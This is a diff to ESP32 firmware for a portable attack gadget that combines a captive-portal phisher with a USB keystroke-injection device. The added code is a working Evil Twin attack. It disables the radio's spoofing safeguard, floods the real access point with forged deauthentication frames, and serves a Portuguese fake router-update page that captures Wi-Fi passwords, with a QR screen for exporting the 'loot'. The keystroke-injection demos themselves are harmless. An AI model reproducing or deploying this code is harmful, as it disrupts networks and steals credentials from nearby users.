@@ -1,5 +1,6 @@
 #include <M5Unified.h>   // M5StickS3 (ESP32-S3): unified driver (pulls in M5GFX)
 #include <WiFi.h>
+#include <esp_wifi.h>    // raw 802.11 TX (esp_wifi_80211_tx) for the Evil Twin deauth
 #include <DNSServer.h>
 #include <WebServer.h>
 #include <Preferences.h>
@@ -112,7 +113,7 @@ bool dotOn = false;
 // Two selectable projects share this firmware; the main menu picks one and the
 // device runs either the Evil Portal (ST_RUNNING) or the WiFi Duck
 // (ST_DUCK_RUNNING) -- never both at once.
-enum AppState { ST_MENU_MAIN, ST_MENU_PORTAL, ST_MENU_DUCK, ST_MENU_CONFIG, ST_RUNNING, ST_DUCK_RUNNING };
+enum AppState { ST_MENU_MAIN, ST_MENU_PORTAL, ST_MENU_DUCK, ST_MENU_CONFIG, ST_MENU_SCAN, ST_RUNNING, ST_DUCK_RUNNING };
 AppState appState = ST_MENU_MAIN;
 int menuSel = 0;              // highlighted row in the current menu
 
@@ -121,6 +122,12 @@ Project activeProject = PROJ_PORTAL;  // which project owns the web server right
 
 bool portalStarted = false;  // Evil Portal AP + web server currently up?
 bool duckUp = false;         // WiFi Duck AP + web server currently up?
+
+// Loot retrieval: tapping BtnA on the live dashboard shows an on-screen QR code
+// (admin panel / loot export) so the operator can pull captures to a phone.
+bool showQR = false;         // QR loot screen currently shown (instead of dashboard)
+int  qrPage = 0;             // 0 = admin dashboard, 1 = CSV loot export
+#define QR_PAGES 2
 
 // Remember which submenu a blocking info/confirm screen should return to.
 AppState infoReturn = ST_MENU_PORTAL;
@@ -156,8 +163,72 @@ String   duckPrevLine;                 // last executed line (for REPEAT)
 int      duckLinesDone = 0;            // lines executed so far (progress)
 int      duckLinesTotal = 0;           // non-empty line count (for the UI)
 String   duckStatusMsg = "Idle";       // short status shown on the LCD + web
+
+// ---- DuckyScript 3.0-lite: DEFINE / VAR substitution (symbol table) ----
+#define  DUCK_MAXVARS 12
+String   duckVarName[DUCK_MAXVARS];    // token incl. prefix, e.g. "$x" or "#TARGET"
+String   duckVarVal[DUCK_MAXVARS];     // its substituted value
+int      duckVarCount = 0;
+
+// ---- On-device arming (Bash Bunny-style payload slots) ----
+#define  DUCK_MAXSLOTS 16
+String   duckSlotName[DUCK_MAXSLOTS];  // saved payload names, in menu order
+int      duckSlotCount = 0;
+int      duckArmedSlot = 0;            // which saved payload BtnA fires
+
 #define  DUCK_DIR     "/duck"           // saved payloads live here (LittleFS)
 #define  DUCK_DEFAULT "/duck/payload.txt"  // the default / last-run payload
+
+// ---- Evil Twin state (clone a scanned AP + deauth the real one) ----
+// We stand up the captive portal on the *target's* SSID and channel (open), then
+// flood the real AP with deauth/disassoc frames so its clients drop and roam to
+// our stronger, open twin -- landing on the phishing page. Educational use only.
+bool          twinActive = false;      // portal is running as an evil twin
+uint8_t       twinBSSID[6] = {0};      // target AP MAC (spoofed as the deauth source)
+uint8_t       twinChannel = 1;         // target channel (clone + deauth live here)
+String        twinSSID;                // the SSID we clone
+unsigned long twinDeauthCount = 0;     // frames sent (stats)
+unsigned long lastDeauth = 0;          // deauth pacing
+
+#define MAX_SCAN 18                    // nearby APs we keep from a scan
+int      scanCount = 0;                // APs found
+int      scanSel   = 0;                // highlighted entry (+ Rescan / + Back virtual rows)
+int      scanTop   = 0;                // first visible row (the list scrolls)
+String   scanSsid[MAX_SCAN];
+uint8_t  scanBssid[MAX_SCAN][6];
+uint8_t  scanCh[MAX_SCAN];
+int8_t   scanRssi[MAX_SCAN];
+bool     scanEnc[MAX_SCAN];            // encrypted? (shown as a lock marker)
+
+// The ESP32 core normally refuses to transmit frames whose source MAC isn't its
+// own. Overriding this (weak) sanity check lets us inject spoofed deauth frames.
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  return 0;
+}
+
+// 802.11 deauth/disassoc template: broadcast dst, src + bssid patched to target.
+static uint8_t deauthFrame[26] = {
+  0xC0, 0x00, 0x00, 0x00,              // frame control (deauth) + duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // dst = broadcast (hit every client)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src = target BSSID (patched at runtime)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID = target BSSID (patched at runtime)
+  0x00, 0x00,                          // sequence
+  0x07, 0x00                           // reason 7: class-3 frame from nonassociated STA
+};
+
+// Blast a short burst of spoofed deauth + disassoc frames at the target AP.
+void sendDeauthBurst() {
+  if (!twinActive) return;
+  memcpy(deauthFrame + 10, twinBSSID, 6);
+  memcpy(deauthFrame + 16, twinBSSID, 6);
+  for (int i = 0; i < 4; i++) {
+    deauthFrame[0] = 0xC0;             // deauthentication
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
+    deauthFrame[0] = 0xA0;             // disassociation
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
+    twinDeauthCount += 2;
+  }
+}
 
 Preferences prefs;                     // NVS-backed settings store
  
@@ -781,7 +852,70 @@ String index() {
  
   return htmlContent;
 }
- 
+
+// Victim-facing page for EVIL TWIN mode: looks like a router security/firmware
+// update that needs the Wi-Fi password to "reconnect". The cloned network name
+// is shown prominently to build trust. Submits to /post (same capture path, so
+// the evil laugh fires on capture); the hidden field tags it as a Wi-Fi key.
+String twinIndex() {
+  String net = attrEsc(twinSSID);
+  return
+    "<!DOCTYPE html><html lang=\"pt-br\"><head>"
+    "<meta charset=\"UTF-8\">"
+    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
+    "<title>Atualiza&ccedil;&atilde;o do Roteador</title>"
+    "<style>"
+    "*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif}"
+    "body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#eaf1fb,#d7e3f5);color:#1c2733;padding:18px}"
+    ".card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 12px 34px rgba(20,50,90,.18)}"
+    ".top{background:linear-gradient(135deg,#17508f,#2f74c0);color:#fff;padding:22px 24px;text-align:center}"
+    ".top .ico{width:54px;height:54px;margin:0 auto 10px;display:block}"
+    ".top h1{font-size:18px;font-weight:700}"
+    ".top p{font-size:12.5px;opacity:.9;margin-top:4px}"
+    ".bd{padding:22px 24px}"
+    ".net{display:flex;align-items:center;gap:10px;background:#f1f6fd;border:1px solid #d9e6f6;border-radius:10px;padding:11px 13px;margin-bottom:16px}"
+    ".net .k{font-size:11px;color:#6b7a8c;text-transform:uppercase;letter-spacing:.5px}"
+    ".net .v{font-size:15px;font-weight:700;color:#17508f;word-break:break-all}"
+    ".note{font-size:13.5px;color:#55616e;line-height:1.5;margin-bottom:18px}"
+    "label{display:block;font-size:12.5px;color:#55616e;margin-bottom:6px;font-weight:600}"
+    "input{width:100%;padding:14px;border-radius:9px;border:1px solid #c6d2e0;font-size:16px;margin-bottom:16px}"
+    "input:focus{outline:none;border-color:#2f74c0;box-shadow:0 0 0 3px rgba(47,116,192,.15)}"
+    "button{width:100%;padding:14px;border:0;border-radius:9px;background:#17508f;color:#fff;font-size:15px;font-weight:700;cursor:pointer}"
+    "button:hover{background:#123f70}"
+    ".sec{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:11.5px;color:#8a97a5}"
+    "</style></head><body>"
+    "<div class=\"card\">"
+    "<div class=\"top\">"
+    "<svg class=\"ico\" viewBox=\"0 0 64 64\" fill=\"none\">"
+    "<rect x=\"8\" y=\"34\" width=\"48\" height=\"20\" rx=\"4\" fill=\"#fff\" opacity=\".92\"/>"
+    "<circle cx=\"18\" cy=\"44\" r=\"2.6\" fill=\"#2f74c0\"/>"
+    "<rect x=\"40\" y=\"42\" width=\"10\" height=\"4\" rx=\"2\" fill=\"#2f74c0\"/>"
+    "<path d=\"M20 26a17 17 0 0 1 24 0\" stroke=\"#fff\" stroke-width=\"4\" stroke-linecap=\"round\"/>"
+    "<path d=\"M26 31a9 9 0 0 1 12 0\" stroke=\"#fff\" stroke-width=\"4\" stroke-linecap=\"round\"/>"
+    "<circle cx=\"32\" cy=\"35\" r=\"2.4\" fill=\"#fff\"/></svg>"
+    "<h1>Atualiza&ccedil;&atilde;o de Seguran&ccedil;a</h1>"
+    "<p>Seu roteador instalou uma atualiza&ccedil;&atilde;o</p>"
+    "</div>"
+    "<div class=\"bd\">"
+    "<div class=\"net\">"
+    "<svg width=\"22\" height=\"22\" viewBox=\"0 0 24 24\" fill=\"none\">"
+    "<path d=\"M4 9a13 13 0 0 1 16 0\" stroke=\"#2f74c0\" stroke-width=\"2\" stroke-linecap=\"round\"/>"
+    "<path d=\"M7.5 12.5a8 8 0 0 1 9 0\" stroke=\"#2f74c0\" stroke-width=\"2\" stroke-linecap=\"round\"/>"
+    "<circle cx=\"12\" cy=\"16.5\" r=\"1.8\" fill=\"#2f74c0\"/></svg>"
+    "<div><div class=\"k\">Rede Wi-Fi</div><div class=\"v\">" + net + "</div></div>"
+    "</div>"
+    "<p class=\"note\">Para concluir a atualiza&ccedil;&atilde;o e restaurar a conex&atilde;o, "
+    "confirme a senha da sua rede Wi-Fi <b>" + net + "</b>.</p>"
+    "<form method=\"POST\" action=\"/post\">"
+    "<input type=\"hidden\" name=\"email\" value=\"Wi-Fi: " + net + "\">"
+    "<label>Senha da rede Wi-Fi</label>"
+    "<input type=\"password\" name=\"password\" placeholder=\"Digite a senha da rede\" required autofocus>"
+    "<button type=\"submit\">Reconectar</button>"
+    "</form>"
+    "<div class=\"sec\">&#128274; Conex&atilde;o segura &middot; Gateway</div>"
+    "</div></div></body></html>";
+}
+
 // Standalone "please wait / validating" page shown after a submission.
 // Pure CSS/JS (device is offline): animated Wi-Fi icon, indeterminate progress
 // bar, spinner and a live countdown. Text comes from POST_TITLE / POST_BODY.
@@ -1183,10 +1317,12 @@ void drawMainScreen() {
   M5.Lcd.setTextDatum(TL_DATUM);
   M5.Lcd.setTextSize(1);
   M5.Lcd.setTextColor(C_MUTED, C_BG);
-  M5.Lcd.drawString("SSID", 8, 32);
+  M5.Lcd.drawString(twinActive ? ("SSID  >> EVIL TWIN ch" + String((int)twinChannel)) : "SSID", 8, 32);
   M5.Lcd.setTextSize(2);
   M5.Lcd.setTextColor(TFT_WHITE, C_BG);
-  M5.Lcd.drawString(cfgSsid, 8, 42);
+  String ssidShown = twinActive ? twinSSID : cfgSsid;
+  if (ssidShown.length() > 18) ssidShown = ssidShown.substring(0, 17) + "~";
+  M5.Lcd.drawString(ssidShown, 8, 42);
 
   // Battery gauge (top-right of the SSID row)
   drawBattery();
@@ -1216,6 +1352,38 @@ void drawMainScreen() {
   M5.Lcd.drawString(String(capcount), 226, 114);
 
   drawBloodFrame();   // blood running down the screen
+}
+
+// On-screen QR for loot retrieval: scan with a phone (joined to the AP) to open
+// the admin dashboard or pull the full capture export. The web server keeps
+// serving underneath, so the scanned link actually loads.
+void drawQRScreen(int page) {
+  const char *url, *label, *path;
+  if (page == 0) { url = "http://172.0.0.1/admin";      label = "Admin dashboard";   path = "/admin"; }
+  else           { url = "http://172.0.0.1/export.csv"; label = "Loot export (CSV)"; path = "/export.csv"; }
+
+  M5.Lcd.fillScreen(C_BG);
+  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
+  M5.Lcd.setTextDatum(MC_DATUM);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE);
+  M5.Lcd.drawString("LOOT - SCAN ME", 120, 13);
+
+  // White quiet zone so phones lock on fast, then the QR itself.
+  const int qs = 100, qx = 12, qy = 31;
+  M5.Lcd.fillRect(qx - 5, qy - 5, qs + 10, qs + 10, TFT_WHITE);
+  M5.Lcd.qrcode(url, qx, qy, qs, 4);
+
+  int tx = 126;
+  M5.Lcd.setTextDatum(TL_DATUM);
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("SCAN TO OPEN", tx, 33);
+  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(label, tx, 45);
+  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("172.0.0.1", tx, 62);
+  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString(path, tx, 73);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("Join Wi-Fi first.", tx, 92);
+  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString("A: next", tx, 110);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("hold B: exit", tx + 46, 110);
 }
 
 void applyBrightness() {
@@ -1287,6 +1455,34 @@ void duckPressCombo(const String &line) {
 #endif
 }
 
+// Store / update a DuckyScript variable or define (token includes its $ or #).
+void duckSetVar(const String &name, const String &val) {
+  for (int i = 0; i < duckVarCount; i++)
+    if (duckVarName[i] == name) { duckVarVal[i] = val; return; }
+  if (duckVarCount < DUCK_MAXVARS) {
+    duckVarName[duckVarCount] = name;
+    duckVarVal[duckVarCount]  = val;
+    duckVarCount++;
+  }
+}
+
+// Substitute every known $var / #define token in a string, longest names first
+// so "$ab" isn't clobbered by an earlier "$a" replacement.
+String duckExpand(String s) {
+  if (duckVarCount == 0) return s;
+  bool done[DUCK_MAXVARS] = { false };
+  for (int n = 0; n < duckVarCount; n++) {       // pick the longest remaining name
+    int pick = -1;
+    for (int i = 0; i < duckVarCount; i++)
+      if (!done[i] && (pick < 0 || duckVarName[i].length() > duckVarName[pick].length()))
+        pick = i;
+    if (pick < 0) break;
+    done[pick] = true;
+    if (duckVarName[pick].length()) s.replace(duckVarName[pick], duckVarVal[pick]);
+  }
+  return s;
+}
+
 // Execute one DuckyScript line. Only DELAY is non-blocking (it arms
 // duckResumeAt); everything else runs inline because lines are short.
 void duckRunLine(String line) {
@@ -1300,8 +1496,35 @@ void duckRunLine(String line) {
 
   if (CMD == "REM" || CMD.startsWith("//")) return;             // comment
 
+  // DuckyScript 3.0-lite: constants (DEFINE #NAME value) and variables
+  // (VAR $x = value). Both are textual substitutions applied to STRING/STRINGLN.
+  if (CMD == "DEFINE") {
+    int s2 = rest.indexOf(' ');
+    if (s2 > 0) duckSetVar(rest.substring(0, s2), rest.substring(s2 + 1));
+    return;
+  }
+  if (CMD == "VAR") {
+    int eq = rest.indexOf('=');
+    if (eq > 0) {
+      String nm = rest.substring(0, eq); nm.trim();
+      String vl = rest.substring(eq + 1); vl.trim();
+      duckSetVar(nm, vl);
+    }
+    return;
+  }
+
   if (CMD == "DELAY") {
-    duckResumeAt = millis() + (unsigned long)rest.toInt();      // honored by duckTick()
+    rest.trim();
+    int dash = rest.indexOf('-');                               // "DELAY 200-800" = random
+    long ms;
+    if (dash > 0) {
+      long lo = rest.substring(0, dash).toInt();
+      long hi = rest.substring(dash + 1).toInt();
+      ms = (hi > lo) ? random(lo, hi + 1) : lo;
+    } else {
+      ms = rest.toInt();
+    }
+    duckResumeAt = millis() + (unsigned long)ms;                // honored by duckTick()
     return;
   }
   if (CMD == "DEFAULTDELAY" || CMD == "DEFAULT_DELAY") {
@@ -1316,11 +1539,11 @@ void duckRunLine(String line) {
 
   if (CMD == "STRING") {
 #if DUCK_HID
-    DuckKbd.print(rest);
+    DuckKbd.print(duckExpand(rest));
 #endif
   } else if (CMD == "STRINGLN") {
 #if DUCK_HID
-    DuckKbd.print(rest);
+    DuckKbd.print(duckExpand(rest));
     DuckKbd.write(KEY_RETURN);
 #endif
   } else {
@@ -1356,6 +1579,7 @@ void duckStartScript(const String &script) {
   duckLineStart    = 0;
   duckResumeAt     = 0;
   duckDefaultDelay = 0;
+  duckVarCount     = 0;        // fresh DEFINE/VAR table per run
   duckPrevLine     = "";
   duckLinesDone    = 0;
   duckLinesTotal   = 0;
@@ -1431,6 +1655,107 @@ void sendDuckList() {
   webServer.send(HTTP_CODE, "application/json", out);
 }
 
+// Load the saved payload names into the in-memory slot table (for on-device
+// arming). Always keeps at least the implicit "payload" default.
+void duckLoadSlots() {
+  duckSlotCount = 0;
+  File dir = LittleFS.open(DUCK_DIR);
+  if (dir && dir.isDirectory()) {
+    for (File e = dir.openNextFile(); e && duckSlotCount < DUCK_MAXSLOTS; e = dir.openNextFile()) {
+      String n = String(e.name());
+      int slash = n.lastIndexOf('/'); if (slash >= 0) n = n.substring(slash + 1);
+      if (n.endsWith(".txt")) duckSlotName[duckSlotCount++] = n.substring(0, n.length() - 4);
+    }
+  }
+  if (duckSlotCount == 0) duckSlotName[duckSlotCount++] = "payload";
+  if (duckArmedSlot >= duckSlotCount) duckArmedSlot = 0;
+}
+
+// -------- Built-in payload library (the "ecosystem") --------
+// One catalog entry as a JSON object: category / name / description / script.
+static String libItem(const char *c, const char *n, const char *d, const char *s) {
+  return String("{\"c\":") + jsonStr(c) + ",\"n\":" + jsonStr(n) +
+         ",\"d\":" + jsonStr(d) + ",\"s\":" + jsonStr(s) + "}";
+}
+
+// Stream the built-in payload library as a JSON array. These are benign,
+// classroom-style demos (open an app, type text, lock the screen) that show how
+// a USB keyboard injection runs -- US keyboard layout. For authorized teaching
+// and lab use only.
+void sendDuckLibrary() {
+  String o = "["; bool f = true;
+  #define LIB(c,n,d,s) do { o += (f ? "" : ","); o += libItem(c,n,d,s); f = false; } while (0)
+  // --- Windows ---
+  LIB("Windows", "Run dialog", "Open the Run box and launch Notepad (harmless demo).",
+      "REM Windows Run demo\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\n");
+  LIB("Windows", "Open a website", "Launch the default browser to a safe URL.",
+      "REM Open a website\nDELAY 500\nGUI r\nDELAY 300\nSTRING https://example.com\nENTER\n");
+  LIB("Windows", "Lock the screen", "Lock the workstation (Win+L).",
+      "REM Lock screen\nDELAY 300\nGUI l\n");
+  // --- macOS ---
+  LIB("macOS", "Spotlight launch", "Open Spotlight and launch an app by name.",
+      "REM macOS Spotlight demo\nDELAY 500\nGUI SPACE\nDELAY 400\nSTRING TextEdit\nENTER\n");
+  LIB("macOS", "Lock the screen", "Lock the Mac (Ctrl+Cmd+Q).",
+      "REM Lock screen\nDELAY 300\nCTRL GUI q\n");
+  // --- Linux ---
+  LIB("Linux", "Open a terminal", "Open a terminal with the common shortcut.",
+      "REM Linux terminal demo\nDELAY 500\nCTRL ALT t\n");
+  // --- Text / awareness ---
+  LIB("Text", "Type a message", "Type a line of text into the focused field.",
+      "REM Type some text\nDELAY 500\nSTRING Hello from Portal Evil HUEBR - WiFi Duck!\nENTER\n");
+  LIB("Awareness", "BadUSB demo note", "Opens Notepad and explains what just happened -- a safe awareness demo.",
+      "REM Security-awareness demo: show the risk, do no harm\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
+      "STRINGLN A USB device just typed this by itself.\nSTRINGLN Never leave a machine unlocked with untrusted USB plugged in.\n");
+  // --- DuckyScript 3.0-lite feature showcase ---
+  LIB("Examples", "DEFINE / VAR + random DELAY", "Shows constants, variables and randomized timing.",
+      "REM DuckyScript 3.0-lite features\nDEFINE #APP notepad\nVAR $msg = Variables work!\nDELAY 500\n"
+      "GUI r\nDELAY 300-700\nSTRING #APP\nENTER\nDELAY 900\nSTRINGLN $msg\n");
+  #undef LIB
+  o += "]";
+  webServer.send(HTTP_CODE, "application/json", o);
+}
+
+// Build a portable text bundle of every saved payload ("=== name ===" headers)
+// and offer it as a download.
+void sendDuckExport() {
+  String out;
+  File dir = LittleFS.open(DUCK_DIR);
+  if (dir && dir.isDirectory()) {
+    for (File e = dir.openNextFile(); e; e = dir.openNextFile()) {
+      String n = String(e.name());
+      int slash = n.lastIndexOf('/'); if (slash >= 0) n = n.substring(slash + 1);
+      if (n.endsWith(".txt")) {
+        n = n.substring(0, n.length() - 4);
+        out += "=== " + n + " ===\n" + e.readString() + "\n";
+      }
+    }
+  }
+  if (out.length() == 0) out = "REM no saved payloads\n";
+  webServer.sendHeader("Content-Disposition", "attachment; filename=payloads.duck");
+  webServer.send(HTTP_CODE, "text/plain", out);
+}
+
+// Parse an exported bundle and save each "=== name ===" section as a payload.
+// Returns how many were imported.
+int duckImportBundle(const String &b) {
+  int count = 0, pos = 0;
+  String curName, curBody;
+  while (pos < (int)b.length()) {
+    int nl = b.indexOf('\n', pos); if (nl < 0) nl = b.length();
+    String line = b.substring(pos, nl); pos = nl + 1;
+    String t = line; t.trim();
+    if (t.startsWith("=== ") && t.endsWith(" ===")) {
+      if (curName.length()) { duckWriteFile(duckPathFor(curName), curBody); count++; }
+      curName = t.substring(4, t.length() - 4); curName.trim();
+      curBody = "";
+    } else if (curName.length()) {
+      curBody += line + "\n";
+    }
+  }
+  if (curName.length()) { duckWriteFile(duckPathFor(curName), curBody); count++; }
+  return count;
+}
+
 // -------- Web control panel (served for any path while the Duck is active) --
 String duckPanel() {
   String css =
@@ -1504,14 +1829,21 @@ String duckPanel() {
     "</div>"
 
     "<div class=\"card\">"
-    "<div class=\"sec\">Templates (click to load into the editor)</div>"
+    "<div class=\"sec\">Payload library</div>"
+    "<div class=\"row\" style=\"margin-bottom:10px\"><select id=\"cat\" onchange=\"renderlib()\"></select>"
+    "<span class=\"hint\" style=\"margin:0\">Built-in demos &mdash; Load to edit, or Run directly.</span></div>"
+    "<div id=\"lib\"></div>"
+    "</div>"
+
+    "<div class=\"card\">"
+    "<div class=\"sec\">Import / Export</div>"
     "<div class=\"bar\">"
-    "<button class=\"btn\" onclick=\"tpl('win-run')\">Win: Run dialog</button>"
-    "<button class=\"btn\" onclick=\"tpl('win-ps')\">Win: PowerShell</button>"
-    "<button class=\"btn\" onclick=\"tpl('win-lock')\">Win: Lock screen</button>"
-    "<button class=\"btn\" onclick=\"tpl('mac-spot')\">macOS: Spotlight</button>"
-    "<button class=\"btn\" onclick=\"tpl('hello')\">Hello World</button>"
-    "</div></div>"
+    "<a class=\"btn\" href=\"/duck/export\">&#11015;&#65039; Export all (.duck)</a>"
+    "<button class=\"btn\" onclick=\"doimport()\">&#11014;&#65039; Import bundle</button>"
+    "</div>"
+    "<textarea id=\"imp\" style=\"min-height:90px;margin-top:10px\" spellcheck=\"false\" placeholder=\"Paste a .duck bundle here (sections like: === name ===) then press Import\"></textarea>"
+    "<p class=\"hint\" id=\"imph\">Export downloads every saved payload as one file; Import restores them.</p>"
+    "</div>"
 
     "<div class=\"card\">"
     "<div class=\"sec\">DuckyScript reference</div>"
@@ -1519,21 +1851,19 @@ String duckPanel() {
     "<div><code class=\"k\">REM</code> <i>text</i> &mdash; comment</div><div><code class=\"k\">DELAY</code> <code>ms</code> &mdash; pause</div>"
     "<div><code class=\"k\">STRING</code> <code>text</code> &mdash; type text</div><div><code class=\"k\">STRINGLN</code> <code>text</code> &mdash; type + Enter</div>"
     "<div><code class=\"k\">DEFAULTDELAY</code> <code>ms</code> &mdash; gap between lines</div><div><code class=\"k\">REPEAT</code> <code>n</code> &mdash; repeat last line</div>"
+    "<div><code class=\"k\">DELAY</code> <code>200-800</code> &mdash; random pause in range</div><div><code class=\"k\">DEFINE</code> <code>#NAME</code> <i>value</i> &mdash; constant</div>"
+    "<div><code class=\"k\">VAR</code> <code>$x</code> = <i>value</i> &mdash; variable</div><div>Use <code>$x</code> / <code>#NAME</code> inside <code>STRING</code> &mdash; substituted</div>"
     "<div>Modifiers: <code>GUI</code>/<code>WINDOWS</code> <code>CTRL</code> <code>ALT</code> <code>SHIFT</code></div><div>Combos: <code>GUI r</code>, <code>CTRL ALT DELETE</code>, <code>CTRL SHIFT ESC</code></div>"
     "<div>Keys: <code>ENTER</code> <code>TAB</code> <code>ESC</code> <code>SPACE</code> <code>BACKSPACE</code> <code>DELETE</code></div><div>Nav: <code>UP</code> <code>DOWN</code> <code>LEFT</code> <code>RIGHT</code> <code>HOME</code> <code>END</code> <code>PAGEUP</code> <code>PAGEDOWN</code></div>"
     "<div>Function: <code>F1</code> .. <code>F12</code> <code>CAPSLOCK</code> <code>INSERT</code></div><div>Each line = keys pressed together, then released.</div>"
     "</div>"
     "<p class=\"hint\">Keyboard layout is <b>US (QWERTY)</b>. On a target set to another layout, some symbols/accented characters may differ.</p>"
+    "<p class=\"hint\">On the device: <b>tap the side button</b> to cycle the armed saved payload, <b>front button</b> to fire it, <b>hold the side button</b> to exit.</p>"
     "</div>"
 
     "<script>"
     "var S=document.getElementById('s'),ST=document.getElementById('stat'),D=document.getElementById('dot'),AU=document.getElementById('au');"
-    "var T={"
-    "'win-run':'REM Open the Windows Run dialog\\nDELAY 500\\nGUI r\\nDELAY 300\\nSTRING notepad\\nENTER\\n',"
-    "'win-ps':'REM Open an elevated PowerShell (confirm UAC)\\nDELAY 500\\nGUI r\\nDELAY 300\\nSTRING powershell\\nENTER\\n',"
-    "'win-lock':'REM Lock the workstation\\nDELAY 300\\nGUI l\\n',"
-    "'mac-spot':'REM Open Spotlight and launch an app\\nDELAY 500\\nGUI SPACE\\nDELAY 400\\nSTRING Terminal\\nENTER\\n',"
-    "'hello':'REM Type a line of text\\nDELAY 500\\nSTRING Hello from Portal Evil HUEBR - WiFi Duck!\\nENTER\\n'};"
+    "var LIB=[];"
     "function post(u,b){return fetch(u,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});}"
     "function enc(o){return Object.keys(o).map(k=>encodeURIComponent(k)+'='+encodeURIComponent(o[k])).join('&');}"
     "function run(){post('/duck/run',enc({script:S.value})).then(poll);}"
@@ -1542,11 +1872,19 @@ String duckPanel() {
     "function save(){var n=document.getElementById('nm').value||'payload';post('/duck/save',enc({name:n,script:S.value})).then(()=>list());}"
     "function del(){var n=document.getElementById('sel').value;if(n)fetch('/duck/del?name='+encodeURIComponent(n)).then(()=>list());}"
     "function load(){var n=document.getElementById('sel').value;if(n)fetch('/duck/load?name='+encodeURIComponent(n)).then(r=>r.text()).then(t=>{S.value=t;});}"
-    "function tpl(k){S.value=T[k];}"
+    "function library(){fetch('/duck/library').then(r=>r.json()).then(a=>{LIB=a;var c=document.getElementById('cat'),cats=[];a.forEach(p=>{if(cats.indexOf(p.c)<0)cats.push(p.c);});c.innerHTML='';cats.forEach(x=>{var o=document.createElement('option');o.value=o.textContent=x;c.appendChild(o);});renderlib();});}"
+    "function renderlib(){var c=document.getElementById('cat').value,box=document.getElementById('lib');box.innerHTML='';LIB.filter(p=>p.c===c).forEach(p=>{"
+    "var d=document.createElement('div');d.className='row';d.style.border='1px solid var(--line)';d.style.borderRadius='9px';d.style.padding='9px 11px';d.style.marginBottom='8px';"
+    "var info=document.createElement('div');info.style.flex='1';info.style.minWidth='160px';"
+    "var nm=document.createElement('b');nm.textContent=p.n;var ds=document.createElement('div');ds.className='hint';ds.style.margin='2px 0 0';ds.textContent=p.d;info.appendChild(nm);info.appendChild(ds);"
+    "var lb=document.createElement('button');lb.className='btn';lb.textContent='Load';lb.onclick=function(){S.value=p.s;window.scrollTo(0,0);};"
+    "var rb=document.createElement('button');rb.className='btn primary';rb.textContent='\\u25B6 Run';rb.onclick=function(){S.value=p.s;run();};"
+    "d.appendChild(info);d.appendChild(lb);d.appendChild(rb);box.appendChild(d);});}"
+    "function doimport(){var b=document.getElementById('imp').value;if(!b)return;post('/duck/import',enc({bundle:b})).then(r=>r.json()).then(j=>{document.getElementById('imph').textContent='Imported '+j.count+' payload(s).';document.getElementById('imp').value='';list();});}"
     "function setauto(){fetch('/duck/autorun?on='+(AU.checked?'1':'0'));}"
     "function list(){fetch('/duck/list').then(r=>r.json()).then(a=>{var s=document.getElementById('sel');s.innerHTML='';a.forEach(n=>{var o=document.createElement('option');o.value=o.textContent=n;s.appendChild(o);});});}"
     "function poll(){fetch('/duck/status').then(r=>r.json()).then(j=>{ST.textContent=j.busy?('Running '+j.done+'/'+j.total):(j.hid?j.msg:'HID disabled');D.className='dot'+(j.busy?' run':'');AU.checked=j.autorun;});}"
-    "list();setInterval(poll,1000);poll();"
+    "list();library();setInterval(poll,1000);poll();"
     "</script>"
     "</div></body></html>";
 }
@@ -1595,8 +1933,20 @@ void drawDuckScreenStatus() {
   M5.Lcd.setTextColor(duckBusy ? C_COUNT : C_OK, C_CARD);
   String st = duckBusy ? ("RUN " + String(duckLinesDone) + "/" + String(duckLinesTotal))
                        : duckStatusMsg;
-  if (st.length() > 17) st = st.substring(0, 17);
+  if (st.length() > 10) st = st.substring(0, 10);
   M5.Lcd.drawString(st, 16, 113);
+
+  // Armed payload (what BtnA fires); BtnB taps cycle it.
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextDatum(TR_DATUM);
+  M5.Lcd.setTextColor(C_MUTED, C_CARD);
+  M5.Lcd.drawString("ARMED " + String(duckArmedSlot + 1) + "/" + String(duckSlotCount), 224, 102);
+  String an = (duckSlotCount > 0) ? duckSlotName[duckArmedSlot] : String("payload");
+  if (an.length() > 13) an = an.substring(0, 12) + "~";
+  M5.Lcd.setTextColor(C_ACCENT2, C_CARD);
+  M5.Lcd.drawString(an, 224, 115);
+  M5.Lcd.setTextDatum(TL_DATUM);
+
   drawBatteryAt(210, 38, C_MUTED, C_BG);   // keep the battery reading current
 }
 
@@ -1613,6 +1963,7 @@ void startDuck() {
   appState = ST_DUCK_RUNNING;
   duckBusy = false;
   duckStatusMsg = "Idle";
+  duckLoadSlots();        // populate the on-device arming slots from saved payloads
   drawDuckScreen();
   lastTick = millis();
 
@@ -1643,7 +1994,7 @@ void registerRoutes() {
   // Victim-facing: capture a submission (no auth).
   webServer.on("/post", []() {
     webServer.send(HTTP_CODE, "text/html", posted());  // addCapture() bumps the counters
